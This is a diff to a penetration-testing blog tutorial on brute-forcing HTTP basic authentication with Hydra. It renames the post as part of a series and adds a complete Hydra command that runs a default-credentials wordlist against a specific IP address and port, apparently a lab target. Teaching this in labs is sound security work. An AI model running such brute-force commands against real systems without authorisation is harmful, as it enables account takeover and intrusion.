@@ -1,5 +1,5 @@
 ---
-title: "Basic HTTP Authentication and Brute-Forcing /w Hydra"
+title: "Brute-Force Series - Basic HTTP Authentication and Brute-Forcing /w Hydra - 01"
 seoTitle: "Hydra Tutorial: HTTP Auth Brute-Force"
 seoDescription: "Learn to secure and test HTTP authentication with Hydra's brute-forcing guide, covering setup, attack execution, and result analysis"
 datePublished: Mon Apr 08 2024 22:38:43 GMT+0000 (Coordinated Universal Time)
@@ -61,6 +61,12 @@ tags: hacking, passwords, pentesting, bruteforceattack, hacking-tutorial
         
 
 ## Visualize the Hydra Attack
+
+**Attacking target:94.237.54.170:56220**
+
+```powershell
+hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 94.237.54.170 -s 56220 http-get
+```
 
 > **1\. Preparation Phase**
 
